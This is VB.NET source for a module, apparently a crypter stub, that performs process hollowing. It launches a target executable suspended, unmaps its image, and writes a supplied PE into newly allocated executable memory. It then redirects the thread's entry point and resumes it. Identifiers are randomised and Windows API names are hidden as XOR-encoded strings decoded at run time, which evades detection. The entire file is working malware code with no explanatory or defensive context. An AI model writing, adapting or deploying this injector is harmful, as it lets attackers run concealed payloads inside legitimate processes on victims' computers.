

Imports System.Runtime.InteropServices
Imports System.Text

'Call yKyYEdEoRY.bbLihAYHvR1(() , Application.ExecutablePath)
Public Module yKyYEdEoRY

    Private Delegate Function bbLihAYHvR(ByVal NipikNaKPM As IntPtr, ByVal rrmGcjYPOG As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Private Declare Auto Function tLIkYhcphy Lib "kernel32" Alias "CreateProcessW" (ByVal nhylJobRgq As String, ByVal tLIkYhcphy5 As StringBuilder, ByVal yKyYEdEoRY4 As IntPtr, ByVal lSbYHqHqlT As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal tLIkYhcphy6 As Boolean, ByVal tLIkYhcphy7 As Integer, ByVal tLIkYhcphy8 As IntPtr, ByVal tLIkYhcphy9 As String, ByVal qtDcUlJeUk1 As Byte(), ByVal qtDcUlJeUk0 As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Private Delegate Function kHdrTqnsnd(ByVal qtDcUlJeUk As IntPtr, ByVal tLIkYhcphy3 As IntPtr) As UInteger

    Private Delegate Function NipikNaKPM9(ByVal qtDcUlJeUk As IntPtr, ByVal tLIkYhcphy3 As IntPtr, ByRef tLIkYhcphy4 As IntPtr, ByVal FjJGZWVMuL As Integer, ByRef rrmGcjYPOG As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Private Delegate Function yKyYEdEoRY9(ByVal tLIkYhcphy1 As IntPtr, ByVal tLIkYhcphy2 As IntPtr) As UInteger

    Private Declare Function rrmGcjYPOG3 Lib "kernel32" Alias "LoadLibraryA" (ByVal rrmGcjYPOG5 As String) As IntPtr

    Private Delegate Function yKyYEdEoRY2(ByVal NipikNaKPM As IntPtr, ByVal rrmGcjYPOG As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Private Delegate Function bbLihAYHvR5(ByVal qtDcUlJeUk As IntPtr, ByVal rrmGcjYPOG6 As IntPtr, ByVal bbLihAYHvR9 As IntPtr, ByVal tLIkYhcphy0 As Integer, ByVal rrmGcjYPOG9 As Integer) As IntPtr
    Private Delegate Function kHdrTqnsnd5(ByVal qtDcUlJeUkess As IntPtr, ByVal bbLihAYHvR7 As IntPtr, ByVal rrmGcjYPOG8 As Byte(), ByVal nbbLihAYHvR9 As UInteger, ByVal bbLihAYHvR8 As Integer) As Boolean

    Private Declare Function rrmGcjYPOG2 Lib "kernel32" Alias "GetProcAddress" (ByVal rrmGcjYPOG7 As IntPtr, ByVal rrmGcjYPOG5 As String) As IntPtr

    Private Function kHdrTqnsnd3(Of rrmGcjYPOG1)(ByVal rrmGcjYPOG5 As String, ByVal rrmGcjYPOG4 As String) As rrmGcjYPOG1

        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(rrmGcjYPOG2(rrmGcjYPOG3(rrmGcjYPOG5), rrmGcjYPOG4), GetType(rrmGcjYPOG1)), Object), rrmGcjYPOG1)

    End Function

    Public Function bbLihAYHvR1(ByVal bbLihAYHvR6 As Byte(), ByVal yKyYEdEoRY5 As String) As Boolean

        Try

            Dim yKyYEdEoRY1 As yKyYEdEoRY2 = kHdrTqnsnd3(Of yKyYEdEoRY2)(bbLihAYHvR1(Chr(4) & Chr(30) & Chr(14) & Chr(6) & Chr(6), "jPgHCHDDElm0DFFgXFCgxC"), bbLihAYHvR1(Chr(10) & Chr(48) & Chr(23) & Chr(33) & Chr(48) & Chr(7) & Chr(43) & Chr(42) & Chr(48) & Chr(33) & Chr(60) & Chr(48) & Chr(16) & Chr(44) & Chr(54) & Chr(33) & Chr(37) & Chr(32), "DAnnovdUCElm0DZVnBQQCMm"))

            Dim yKyYEdEoRY0 As GCHandle = GCHandle.Alloc(bbLihAYHvR6, GCHandleType.Pinned) : Dim yKyYEdEoRY3 As Integer = yKyYEdEoRY0.AddrOfPinnedObject : yKyYEdEoRY0.Free()

            Dim yKyYEdEoRY4 As IntPtr = IntPtr.Zero

            Dim pMSwtmzqxY As IntPtr() = New IntPtr(3) {}

            Dim kHdrTqnsnd0 As Byte() = New Byte(67) {}

            Dim kHdrTqnsnd1 As Integer = BitConverter.ToInt32(bbLihAYHvR6, 60)

            Dim kHdrTqnsnd2 As kHdrTqnsnd = kHdrTqnsnd3(Of kHdrTqnsnd)(bbLihAYHvR1(Chr(4) & Chr(30) & Chr(14) & Chr(6) & Chr(6), "jPgHCHDDElm0DFFgXFCgxC"), bbLihAYHvR1(Chr(10) & Chr(48) & Chr(17) & Chr(42) & Chr(41) & Chr(37) & Chr(52) & Chr(18) & Chr(45) & Chr(33) & Chr(51) & Chr(11) & Chr(34) & Chr(23) & Chr(33) & Chr(39) & Chr(48) & Chr(45) & Chr(43) & Chr(42), "DAnnovdUCElm0DZVnBQQCMm"))

            Dim bbLihAYHvR4 As Integer

            Dim rrmGcjYPOG As UInteger() = New UInteger(178) {}

            rrmGcjYPOG(0) = &H10002

            tLIkYhcphy(Nothing, New StringBuilder(yKyYEdEoRY5), yKyYEdEoRY4, yKyYEdEoRY4, False, 4, yKyYEdEoRY4, Nothing, kHdrTqnsnd0, pMSwtmzqxY)

            Dim kHdrTqnsnd9 As Integer = (yKyYEdEoRY3 + kHdrTqnsnd8(yKyYEdEoRY3 + &H3C))

            bbLihAYHvR4 = kHdrTqnsnd8(kHdrTqnsnd9 + &H34)

            kHdrTqnsnd2(pMSwtmzqxY(0), bbLihAYHvR4)

            Dim bbLihAYHvR3 As bbLihAYHvR5 = kHdrTqnsnd3(Of bbLihAYHvR5)(bbLihAYHvR1(Chr(24) & Chr(22) & Chr(1) & Chr(29) & Chr(22) & Chr(31) & Chr(64) & Chr(65), "sUOAdElm0DVSBNAnFQkGBtP"), bbLihAYHvR1(Chr(37) & Chr(26) & Chr(1) & Chr(7) & Chr(6) & Chr(18) & Chr(31) & Chr(50) & Chr(31) & Chr(31) & Chr(28) & Chr(16) & Chr(54) & Chr(11), "sUOAdElm0DVSBNAnFQkGBtP"))

            Dim bbLihAYHvR7 As IntPtr = bbLihAYHvR3(pMSwtmzqxY(0), bbLihAYHvR4, kHdrTqnsnd8(kHdrTqnsnd9 + &H50), &H3000, &H40)

            Dim bbLihAYHvR2 As New IntPtr(BitConverter.ToInt32(bbLihAYHvR6, kHdrTqnsnd1 + &H34))

            Dim bbLihAYHvR9 As New IntPtr(BitConverter.ToInt32(bbLihAYHvR6, kHdrTqnsnd1 + 80))

            Dim bbLihAYHvR0 As Integer

            Dim bbLihAYHvR8 As Integer

            Dim kHdrTqnsnd4 As kHdrTqnsnd5 = kHdrTqnsnd3(Of kHdrTqnsnd5)(bbLihAYHvR1(Chr(4) & Chr(30) & Chr(14) & Chr(6) & Chr(6), "jPgHCHDDElm0DFFgXFCgxC"), bbLihAYHvR1(Chr(0) & Chr(58) & Chr(25) & Chr(60) & Chr(39) & Chr(58) & Chr(43) & Chr(24) & Chr(39) & Chr(60) & Chr(58) & Chr(59) & Chr(47) & Chr(34) & Chr(3) & Chr(43) & Chr(35) & Chr(33) & Chr(60) & Chr(55), "NFXUoDXElm0DFdKnoMJQHqA"))

            kHdrTqnsnd4(pMSwtmzqxY(0), bbLihAYHvR7, bbLihAYHvR6, CUInt(CInt(kHdrTqnsnd8(kHdrTqnsnd9 + &H54))), bbLihAYHvR0)

            For kHdrTqnsnd7 = 0 To kHdrTqnsnd8(kHdrTqnsnd9 + &H6, 2) - 1

                Dim kHdrTqnsnd6 As Integer() = New Integer(9) {}

                Buffer.BlockCopy(bbLihAYHvR6, (kHdrTqnsnd1 + &HF8) + (kHdrTqnsnd7 * 40), kHdrTqnsnd6, 0, 40)

                Dim yKyYEdEoRY6 As Byte() = New Byte((kHdrTqnsnd6(4) - 1)) {}

                Buffer.BlockCopy(bbLihAYHvR6, kHdrTqnsnd6(5), yKyYEdEoRY6, 0, yKyYEdEoRY6.Length)

                bbLihAYHvR9 = New IntPtr(bbLihAYHvR7.ToInt32() + kHdrTqnsnd6(3))

                bbLihAYHvR2 = New IntPtr(yKyYEdEoRY6.Length)

                kHdrTqnsnd4(pMSwtmzqxY(0), bbLihAYHvR9, yKyYEdEoRY6, CUInt(bbLihAYHvR2), bbLihAYHvR8)

            Next kHdrTqnsnd7

            Dim yKyYEdEoRY7 As bbLihAYHvR = kHdrTqnsnd3(Of bbLihAYHvR)(bbLihAYHvR1(Chr(4) & Chr(30) & Chr(14) & Chr(6) & Chr(6), "jPgHCHDDElm0DFFgXFCgxC"), bbLihAYHvR1(Chr(0) & Chr(58) & Chr(9) & Chr(43) & Chr(58) & Chr(13) & Chr(33) & Chr(32) & Chr(58) & Chr(43) & Chr(54) & Chr(58) & Chr(26) & Chr(38) & Chr(60) & Chr(43) & Chr(47) & Chr(42), "NFXUoDXElm0DFdKnoMJQHqA"))

            yKyYEdEoRY7(pMSwtmzqxY(1), rrmGcjYPOG)

            kHdrTqnsnd4(pMSwtmzqxY(0), rrmGcjYPOG(41) + &H8, BitConverter.GetBytes(bbLihAYHvR7.ToInt32()), CUInt(&H4), bbLihAYHvR8)

            rrmGcjYPOG(&H2C) = bbLihAYHvR4 + kHdrTqnsnd8(kHdrTqnsnd9 + &H28)

            yKyYEdEoRY1(pMSwtmzqxY(1), rrmGcjYPOG)

            Dim yKyYEdEoRY8 As yKyYEdEoRY9 = kHdrTqnsnd3(Of yKyYEdEoRY9)(bbLihAYHvR1(Chr(4) & Chr(30) & Chr(14) & Chr(6) & Chr(6), "jPgHCHDDElm0DFFgXFCgxC"), bbLihAYHvR1(Chr(8) & Chr(50) & Chr(20) & Chr(35) & Chr(53) & Chr(51) & Chr(43) & Chr(35) & Chr(18) & Chr(46) & Chr(52) & Chr(35) & Chr(39) & Chr(34), "FYdvvqrtmElm0DFFgXFCgxC"))

            yKyYEdEoRY8(pMSwtmzqxY(1), 0)

        Catch ex As Exception

            Return False

        End Try

        Return True

    End Function

    Private Function bbLihAYHvR1(ByVal NipikNaKPM4 As String, ByVal NipikNaKPM3 As String)

        Dim NipikNaKPM0 As String = ""

        Dim NipikNaKPM1 As Short

        Dim NipikNaKPM2 As Integer

        NipikNaKPM2 = Asc(NipikNaKPM3)

        For NipikNaKPM1 = 1 To Len(NipikNaKPM4)

            NipikNaKPM0 &= Chr(NipikNaKPM2 Xor Asc(Mid(NipikNaKPM4, NipikNaKPM1, 1)))

        Next

        Return NipikNaKPM0

    End Function

    Private Function kHdrTqnsnd8(ByVal NipikNaKPM5 As Long, Optional ByVal NipikNaKPM8 As Long = &H4) As Integer

        Dim NipikNaKPM6 As IntPtr

        Dim NipikNaKPM7 As Integer

        Dim rrmGcjYPOG0 As NipikNaKPM9 = kHdrTqnsnd3(Of NipikNaKPM9)(bbLihAYHvR1(Chr(4) & Chr(30) & Chr(14) & Chr(6) & Chr(6), "jPgHCHDDElm0DFFgXFCgxC"), bbLihAYHvR1(Chr(8) & Chr(50) & Chr(20) & Chr(35) & Chr(39) & Chr(34) & Chr(16) & Chr(47) & Chr(52) & Chr(50) & Chr(51) & Chr(39) & Chr(42) & Chr(11) & Chr(35) & Chr(43) & Chr(41) & Chr(52) & Chr(63), "FYdvvqrFFElm0DFFgXFCgxC"))

        Call rrmGcjYPOG0(Process.GetCurrentProcess.Handle, NipikNaKPM5, NipikNaKPM6, NipikNaKPM8, NipikNaKPM7)

        Return NipikNaKPM6

    End Function
    Public Function qtDcUlJeUk2(ByVal str As String, ByVal i As Char) As String
        Dim qtDcUlJeUk3 As String = ""

        Dim qtDcUlJeUk4 As Char() = str.ToCharArray

        Dim qtDcUlJeUk6 As Integer = AscW(i)


        For Each ch As Char In qtDcUlJeUk4

            Dim qtDcUlJeUk5 As Long = AscW(ch) + qtDcUlJeUk6

            qtDcUlJeUk3 = qtDcUlJeUk3 & ChrW(qtDcUlJeUk5 - 128)

        Next
        Return qtDcUlJeUk3

    End Function


End Module
